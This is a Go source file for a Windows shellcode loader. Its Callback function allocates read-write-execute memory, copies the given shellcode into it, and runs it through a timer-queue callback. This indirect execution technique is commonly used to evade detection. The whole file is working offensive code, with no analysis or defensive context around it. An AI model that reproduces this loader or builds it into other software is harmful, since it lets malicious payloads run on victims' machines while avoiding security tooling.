package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	TRUE                   = 1
	FALSE                  = 0
	INFINITE               = 0xFFFFFFFF
)

var (
	kernel32              = syscall.MustLoadDLL("kernel32.dll")
	ntdll                 = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc          = kernel32.MustFindProc("VirtualAlloc")
	CreateTimerQueue      = kernel32.MustFindProc("CreateTimerQueue")
	CreateEventW          = kernel32.MustFindProc("CreateEventW")
	WaitForSingleObject   = kernel32.MustFindProc("WaitForSingleObject")
	CreateTimerQueueTimer = kernel32.MustFindProc("CreateTimerQueueTimer")
	RtlMoveMemory         = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	queue, _, _ := CreateTimerQueue.Call()
	gDoneEvent, _, _ := CreateEventW.Call(0, TRUE, FALSE, 0)
	CreateTimerQueueTimer.Call((uintptr)(unsafe.Pointer(&timer)), queue, addr, 0, 100, 0, 0)
	WaitForSingleObject.Call(gDoneEvent, INFINITE)
}
